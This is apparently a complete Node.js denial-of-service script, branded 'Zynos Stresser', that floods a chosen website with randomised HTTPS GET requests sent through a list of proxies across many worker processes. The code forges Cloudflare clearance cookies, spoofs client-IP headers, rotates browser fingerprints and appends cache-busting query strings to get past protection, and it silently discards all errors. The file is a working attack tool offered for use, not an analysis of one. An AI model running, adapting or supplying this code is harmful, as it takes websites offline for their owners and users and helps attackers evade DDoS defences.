const net = require("net");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const os = require("os");

const blue = '\x1b[34m';
const white = '\x1b[37m';
const reset = '\x1b[0m';

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

const accept_header = [
  '*/*',
  'image/*',
  'image/webp,image/apng',
  'text/html',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
];

const encoding_header = [
  '*',
  '*/*',
  'gzip',
  'gzip, deflate, br',
  'gzip, deflate',
  "gzip, deflate, br, zstd"
];

const cache_header = [
  'max-age=0',
  'no-cache',
  'no-store',
  'pre-check=0',
  'post-check=0',
  'must-revalidate',
  'proxy-revalidate',
  's-maxage=604800',
  'no-cache, private',
  'max-age=300, must-revalidate',
  'no-store, max-age=0, private, must-revalidate',
  'public, max-age=10, s-maxage=10',
  'no-cache, no-store,private, max-age=0, must-revalidate',
  'no-cache, no-store,private, s-maxage=604800, must-revalidate',
  'no-cache, no-store,private, max-age=604800, must-revalidate',
];

const refers = [
  "https://google.com",
  "https://check-host.net/",
  "https://www.facebook.com/",
  "https://www.youtube.com/",
  "https://www.fbi.com/",
  "https://discord.com",
  "https://www.cloudflare.com",
];

const uap = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/133.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Edge/133.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0",
];

const language_header = [
  "id-ID,id;q=0.9,en;q=0.8",
  "en-US,en;q=0.9,id;q=0.8",
  "en-GB,en;q=0.9",
  "ja-JP,ja;q=0.9,en;q=0.8",
  "zh-CN,zh;q=0.9,en;q=0.8"
];

const fetch_site = [
  "same-origin", 
  "same-site", 
  "cross-site", 
  "none"
];

const fetch_mode = [
  "navigate", 
  "same-origin", 
  "no-cors", 
  "cors"
];

const fetch_dest = [
  "document", 
  "sharedworker", 
  "subresource", 
  "unknown", 
  "worker"
];

const sec_ch_ua = [
  '"Google Chrome";v="133", "Chromium";v="133", "Not_A Brand";v="24"',
  '"Google Chrome";v="132", "Chromium";v="132", "Not_A Brand";v="24"',
  '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
  '"Microsoft Edge";v="133", "Chromium";v="133", "Not_A Brand";v="24"',
  '"Brave";v="133", "Chromium";v="133", "Not_A Brand";v="24"',
  '"Brave";v="149.0.0.0", "Chromium";v="149.0.0.0", "Not?A_Brand";v="24.0.0.0"',
  '"Brave";v="150.0.0.0", "Chromium";v="150.0.0.0", "Not?A_Brand";v="24.0.0.0"',
  '"Brave";v="148.0.0.0", "Chromium";v="148.0.0.0", "Not?A_Brand";v="24.0.0.0"',
  '"Google Chrome";v="130", "Chromium";v="130", "Not_A Brand";v="24"',
  '"Google Chrome";v="129", "Chromium";v="129", "Not_A Brand";v="24"',
  '"Opera";v="118", "Chromium";v="133", "Not_A Brand";v="24"'    
];

const sec_ch_ua_platform = [
  '"Windows"',
  '"macOS"',
  '"Linux"',
  '"Android"',
  '"iOS"'
];

const sec_ch_ua_mobile = [
  '?0',
  '?1',
  '?0'
];

if (process.argv.length < 7) {
    console.log(`Usage: host time req thread proxy.txt`);
    process.exit();
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
};

var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
    console.clear();
    console.log(`\x1b[36m--------------------------------------------\x1b[0m`);
    console.log(`\x1b[33mUser: \x1b[32mPrv\x1b[0m \x1b[36m|\x1b[0m \x1b[33mVip: \x1b[32mtrue\x1b[0m \x1b[36m|\x1b[0m \x1b[33mSuperVip: \x1b[32mtrue\x1b[0m`);
    console.log(`\x1b[33mAdmin: \x1b[35mZYNOS\x1b[0m \x1b[36m|\x1b[0m \x1b[33mExpired: \x1b[31mNo\x1b[0m \x1b[36m|\x1b[0m \x1b[33mTime Limit: \x1b[32m${args.time}s\x1b[0m`);
    console.log(`\x1b[36m--------------------------------------------\x1b[0m`);
    console.log(`\x1b[33mTarget: \x1b[37m${args.target}\x1b[0m`);
    console.log(`\x1b[33mRate: \x1b[37m${args.Rate}/s\x1b[0m \x1b[36m|\x1b[0m \x1b[33mThreads: \x1b[37m${args.threads}\x1b[0m`);
    console.log(`\x1b[33mProxy: \x1b[37m${args.proxyFile} (\x1b[32m${proxies.length}\x1b[37m)\x1b[0m`);
    console.log(`\x1b[36m--------------------------------------------\x1b[0m`);
    console.log(`\x1b[35mZynos Stresser 2025-2026 | C2 | t.me/zynos_official\x1b[0m`);
    console.log(`\x1b[36m--------------------------------------------\x1b[0m`);

    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder, 1);
}

// ========== NET SOCKET CLASS ==========
class NetSocket {
    constructor() { }

    HTTP(options, callback) {
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);
        const connection = net.connect({
            host: options.host,
            port: options.port,
        });

        connection.setTimeout(options.timeout * 1000);
        connection.setKeepAlive(true, 60000);
        connection.setNoDelay(true);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            if (response.includes("HTTP/1.1 200")) {
                return callback(connection, undefined);
            } else {
                connection.destroy();
                return callback(undefined, "error: invalid response");
            }
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout");
        });

        connection.on("error", () => {
            connection.destroy();
            return callback(undefined, "error: connection error");
        });
    }
}

const Socker = new NetSocket();

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(line => line.trim() && !line.startsWith('#'));
}

function randomElement(elements) {
    return elements[Math.floor(Math.random() * elements.length)];
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    
    const val = {
        'NEL': JSON.stringify({
            "report_to": "cf-nel",
            "max_age": 604800,
            "include_subdomains": true
        })
    };
    
    const rateHeaders = [
        { "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" },
        { "accept-language": "en-US,en;q=0.9,id;q=0.8,ja;q=0.7" },
        { "referer": refers[Math.floor(Math.random() * refers.length)] },
        { "cache-control": "no-cache" },
        { "user-agent": uap[Math.floor(Math.floor(Math.random() * uap.length))] },
        { "cookie": "cf_clearance=" + randstr(8) + "." + randstr(24) + "." + randstr(48) + "-0.0.1; _ga=" + randstr(20) + "; _gid=" + randstr(15) + "; __cf_bm=" + randstr(44) },
        { "sec-ch-ua": '"Google Chrome";v="133", "Chromium";v="133", "Not_A Brand";v="24"' },
        { "Accept-Range": Math.random() < 0.5 ? 'bytes' : 'none' },
        { "sec-ch-ua-mobile": "?0" },
        { "sec-ch-ua-platform": '"Windows"' },
        { "sec-fetch-site": "same-origin" },
        { "sec-fetch-mode": "cors" },
        { "sec-fetch-dest": "empty" },
        { "accept-encoding": "gzip, deflate, br, zstd" },
        { "priority": "u=0, i" },
        { "dnt": "1" }
    ];
    
    const spoofHeaders = [
        { "X-Forwarded-For": parsedProxy[0] },
        { "cf-connecting-ip": parsedProxy[0] },
        { "X-Forwarded-Proto": "https" },
        { "X-Real-IP": parsedProxy[0] },
        { "origin": "https://" + parsedTarget.host },
        { "referer": "https://" + parsedTarget.host + "/" },
        { "accept-char": "UTF-8" },
        { "Geo-Location": "UNKNOWN" },
        { "cookie": "__cf_bm=" + randstr(44) + "." + randstr(24) + "." + randstr(48) + "-" + Date.now() + "-0-0.0.1; cf_clearance=" + randstr(8) + "." + randstr(24) + "." + randstr(48) + "-0.0.1" },
        { "sec-ch-ua": sec_ch_ua[Math.floor(Math.random() * sec_ch_ua.length)] },
        { "sec-ch-ua-mobile": sec_ch_ua_mobile[Math.floor(Math.random() * sec_ch_ua_mobile.length)] },
        { "sec-ch-ua-platform": sec_ch_ua_platform[Math.floor(Math.random() * sec_ch_ua_platform.length)] },
        { "sec-fetch-user": "?1" },
        { "te": "trailers" },
        { "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" },
        { "source-ip": randstr(5)  },
        { "via": randstr(5)  },
        { "cluster-ip": randstr(5)  },
        { "upgrade-insecure-requests": "1" },
        { "dnt": "1" },
        { "cache-control": "no-store, max-age=0, private, must-revalidate" },
        { "pragma": "no-cache" },
        { "x-requested-with": "XMLHttpRequest" }
    ];
    
    let ZynosHeaders = {
      "Host": parsedTarget.host,
      "User-Agent": uap[Math.floor(Math.random() * uap.length)],
      "Accept": accept_header[Math.floor(Math.random() * accept_header.length)],
      "Accept-Encoding": encoding_header[Math.floor(Math.random() * encoding_header.length)],
      "Accept-Language": language_header[Math.floor(Math.random() * language_header.length)],
      "Cache-Control": cache_header[Math.floor(Math.random() * cache_header.length)],
      "Referer": refers[Math.floor(Math.random() * refers.length)],
      "Connection": "Keep-Alive",
      "Upgrade-Insecure-Requests": "1",
      "Pragma": "no-cache"
    };
    
    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1] || 8080,
        address: parsedTarget.host,
        timeout: 10
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error || !connection) return;

        connection.setKeepAlive(true, 60000);
        connection.setNoDelay(true);

        const tlsOptions = {
            socket: connection,
            servername: parsedTarget.host,
            rejectUnauthorized: false,
        };

        const tlsSocket = tls.connect(443, parsedTarget.host, tlsOptions, () => {
            tlsSocket.setKeepAlive(true, 60000);
            tlsSocket.setNoDelay(true);

            const interval = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const path = (parsedTarget.path || "/") + "?" + randstr(6) + "=" + generateRandomString(20, 30) + "&" + randstr(4) + "=" + generateRandomString(15, 25);
                    const method = "GET";
                    
                    const dynHeaders = {
                        ...ZynosHeaders,
                        ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
                        ...spoofHeaders[Math.floor(Math.random() * spoofHeaders.length)]
                    };
                    
                    let headersString = `${method} ${path} HTTP/1.1\r\n`;
                    for (const [key, value] of Object.entries(dynHeaders)) {
                        headersString += `${key}: ${value}\r\n`;
                    }
                    headersString += `\r\n`;

                    try {
                        tlsSocket.write(headersString);
                    } catch (err) { }
                }
            }, 1000);

            tlsSocket.on("close", () => {
                clearInterval(interval);
                tlsSocket.destroy();
                connection.destroy();
            });

            tlsSocket.on("error", () => {
                clearInterval(interval);
                tlsSocket.destroy();
                connection.destroy();
            });
        });

        tlsSocket.on("error", () => {
            tlsSocket.destroy();
            connection.destroy();
        });
    });
}

const StopScript = () => process.exit(1);
setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', () => { });
process.on('unhandledRejection', () => { });